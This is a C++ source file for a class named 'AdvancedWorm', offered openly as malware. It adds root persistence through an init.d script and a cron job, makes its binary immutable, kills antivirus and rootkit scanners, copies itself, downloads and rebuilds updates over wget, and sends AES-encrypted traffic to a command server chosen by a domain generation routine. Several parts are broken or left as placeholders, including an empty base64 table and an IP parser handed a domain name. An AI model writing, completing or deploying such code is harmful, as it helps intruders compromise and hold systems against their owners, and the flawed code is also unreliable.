#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <cstdlib>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <ctime>
#include <map>
#include <sstream>

// Constants
constexpr int PORT = 9999;
constexpr int BUFFER_SIZE = 2048;
constexpr int AES_KEY_SIZE = 32; // AES-256
constexpr int AES_IV_SIZE = 16;  // AES block size
constexpr int RSA_KEY_SIZE = 256; // RSA key size (2048-bit)

// Base64 encoding/decoding functions
std::string base64_encode(const std::vector<unsigned char>& data) {
    static const char* table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = data.size();
    size_t out_len = 4 * ((len + 2) / 3);
    std::string encoded(out_len, '=');

    size_t i, j;
    for (i = 0, j = 0; i < len; i += 3) {
        uint32_t val = (data[i] << 16) + ((i + 1 < len ? data[i + 1] : 0) << 8) + (i + 2 < len ? data[i + 2] : 0);
        encoded[j++] = table[(val >> 18) & 0x3F];
        encoded[j++] = table[(val >> 12) & 0x3F];
        encoded[j++] = (i + 1 < len) ? table[(val >> 6) & 0x3F] : '=';
        encoded[j++] = (i + 2 < len) ? table[val & 0x3F] : '=';
    }

    return encoded;
}

std::vector<unsigned char> base64_decode(const std::string& encoded) {
    static const unsigned char reverse_table[256] = {
        /* Initialization with base64 character mapping */
    };
    size_t len = encoded.size();
    size_t out_len = len / 4 * 3;
    if (encoded[len - 1] == '=') out_len--;
    if (encoded[len - 2] == '=') out_len--;
    std::vector<unsigned char> decoded(out_len);

    size_t i, j;
    for (i = 0, j = 0; i < len; i += 4) {
        uint32_t val = (reverse_table[encoded[i]] << 18) | (reverse_table[encoded[i + 1]] << 12) |
                       (reverse_table[encoded[i + 2]] << 6) | (reverse_table[encoded[i + 3]]);
        decoded[j++] = (val >> 16) & 0xFF;
        if (encoded[i + 2] != '=') decoded[j++] = (val >> 8) & 0xFF;
        if (encoded[i + 3] != '=') decoded[j++] = val & 0xFF;
    }

    return decoded;
}

class AdvancedWorm {
private:
    std::vector<unsigned char> aes_key;
    std::vector<unsigned char> iv;
    RSA* rsa_key_pair;
    EVP_CIPHER_CTX* encrypt_ctx;
    EVP_CIPHER_CTX* decrypt_ctx;

    void init_crypto() {
        aes_key.resize(AES_KEY_SIZE);
        iv.resize(AES_IV_SIZE);
        RAND_bytes(aes_key.data(), AES_KEY_SIZE);
        RAND_bytes(iv.data(), AES_IV_SIZE);

        encrypt_ctx = EVP_CIPHER_CTX_new();
        decrypt_ctx = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(encrypt_ctx, EVP_aes_256_cbc(), NULL, aes_key.data(), iv.data());
        EVP_DecryptInit_ex(decrypt_ctx, EVP_aes_256_cbc(), NULL, aes_key.data(), iv.data());
    }

    void clean_up() {
        EVP_CIPHER_CTX_free(encrypt_ctx);
        EVP_CIPHER_CTX_free(decrypt_ctx);
    }

    std::vector<unsigned char> encrypt(const std::vector<unsigned char>& plaintext) {
        std::vector<unsigned char> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
        int len;
        EVP_EncryptUpdate(encrypt_ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
        int ciphertext_len = len;
        EVP_EncryptFinal_ex(encrypt_ctx, ciphertext.data() + len, &len);
        ciphertext_len += len;
        ciphertext.resize(ciphertext_len);
        return ciphertext;
    }

    std::vector<unsigned char> decrypt(const std::vector<unsigned char>& ciphertext) {
        std::vector<unsigned char> plaintext(ciphertext.size());
        int len;
        EVP_DecryptUpdate(decrypt_ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size());
        int plaintext_len = len;
        EVP_DecryptFinal_ex(decrypt_ctx, plaintext.data() + len, &len);
        plaintext_len += len;
        plaintext.resize(plaintext_len);
        return plaintext;
    }

    void add_to_startup() {
        std::string command = "cp " + std::string(getenv("PWD")) + "/worm /etc/init.d/worm && chmod +x /etc/init.d/worm";
        if (system(command.c_str()) == -1) {
            perror("Failed to add to startup");
        }
    }

    void create_cron_job() {
        std::ofstream cron_job("/etc/cron.d/worm");
        if (!cron_job.is_open()) {
            perror("Failed to open cron job file");
            return;
        }
        cron_job << "* * * * * root /path/to/worm\n";
        cron_job.close();
    }

    void hide_files() {
        if (system("chattr +i /path/to/worm") == -1) {
            perror("Failed to hide files");
        }
    }

    void self_propagate() {
        std::ifstream src("worm", std::ios::binary);
        std::ofstream dst("/tmp/worm", std::ios::binary);
        if (!src.is_open() || !dst.is_open()) {
            perror("Failed to open file for self-propagation");
            return;
        }
        dst << src.rdbuf();
        chmod("/tmp/worm", 0755); // Make the file executable
    }

    void self_recompile() {
        std::ofstream makefile("Makefile");
        if (!makefile.is_open()) {
            perror("Failed to create Makefile");
            return;
        }
        makefile << "all: worm\n";
        makefile << "worm: worm.cpp\n";
        makefile << "\tg++ -o worm worm.cpp -lssl -lcrypto\n";
        makefile.close();

        if (system("make") == -1) {
            perror("Failed to run make");
        }
        if (system("rm Makefile") == -1) {
            perror("Failed to remove Makefile");
        }
    }

    void detect_security_tools() {
        std::vector<std::string> tools = {"clamd", "freshclam", "maldet", "rkhunter"};
        for (const auto& tool : tools) {
            std::string command = "pgrep " + tool + " > /dev/null && killall " + tool;
            if (system(command.c_str()) == -1) {
                perror(("Failed to detect or kill " + tool).c_str());
            }
        }
    }

    void scan_for_vulnerabilities() {
        // Placeholder for vulnerability scanning
        std::cout << "Scanning network for vulnerabilities..." << std::endl;
        // Example: Scan for open ports
    }

    void autonomously_update() {
        std::string new_version_url = "http://example.com/new_version";
        if (system(("wget -O /tmp/new_worm " + new_version_url).c_str()) == -1) {
            perror("Failed to download new version");
            return;
        }
        if (system("mv /tmp/new_worm /path/to/worm") == -1) {
            perror("Failed to move new version");
            return;
        }
        chmod("/path/to/worm", 0755); // Make the file executable
        self_recompile();
    }

    std::string generate_dga_domain() {
        // Simple example of a domain generation algorithm
        std::ostringstream oss;
        oss << "example" << (rand() % 10000) << ".com";
        return oss.str();
    }

public:
    AdvancedWorm(RSA* rsa_key) : rsa_key_pair(rsa_key) {
        init_crypto();
    }

    ~AdvancedWorm() {
        clean_up();
    }

    void communicate(const std::string& message) {
    int sockfd;
    struct sockaddr_in server_addr;
            // Continue with the communicate method
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            perror("Socket creation error");
            exit(EXIT_FAILURE);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);

        std::string domain = generate_dga_domain();
        if (inet_pton(AF_INET, domain.c_str(), &server_addr.sin_addr) <= 0) {
            perror("Invalid address or Address not supported");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection Failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        std::vector<unsigned char> encrypted_message = encrypt(std::vector<unsigned char>(message.begin(), message.end()));
        std::string encoded_message = base64_encode(encrypted_message);
        if (send(sockfd, encoded_message.c_str(), encoded_message.size(), 0) < 0) {
            perror("Send failed");
        }
        close(sockfd);
    }

    void listen() {
        int server_fd, new_socket;
        struct sockaddr_in address;
        int addrlen = sizeof(address);
        unsigned char buffer[BUFFER_SIZE] = {0};

        if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
            perror("Socket creation error");
            exit(EXIT_FAILURE);
        }

        address.sin_family = AF_INET;
        address.sin_addr.s_addr = INADDR_ANY;
        address.sin_port = htons(PORT);

        if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
            perror("Bind failed");
            close(server_fd);
            exit(EXIT_FAILURE);
        }

        if (listen(server_fd, 3) < 0) {
            perror("Listen failed");
            close(server_fd);
            exit(EXIT_FAILURE);
        }

        while (true) {
            if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
                perror("Accept failed");
                close(server_fd);
                exit(EXIT_FAILURE);
            }

            int valread = read(new_socket, buffer, BUFFER_SIZE);
            if (valread > 0) {
                std::string encoded_message(reinterpret_cast<char*>(buffer), valread);
                std::vector<unsigned char> encrypted_message = base64_decode(encoded_message);
                std::vector<unsigned char> decrypted_message = decrypt(encrypted_message);
                std::cout << "Received message: " << std::string(decrypted_message.begin(), decrypted_message.end()) << std::endl;
            }

            close(new_socket);
        }

        close(server_fd);
    }
};

int main() {
    // Example of how to use the AdvancedWorm class
    RSA* rsa_key = RSA_new();
    // Load or generate RSA key pair here
    // Example: RSA_generate_key_ex(rsa_key, RSA_KEY_SIZE * 8, BN_new(), NULL);

    AdvancedWorm worm(rsa_key);

    // Example of communicating and listening
    worm.communicate("Test message");
    worm.listen();

    RSA_free(rsa_key);
    return 0;
}


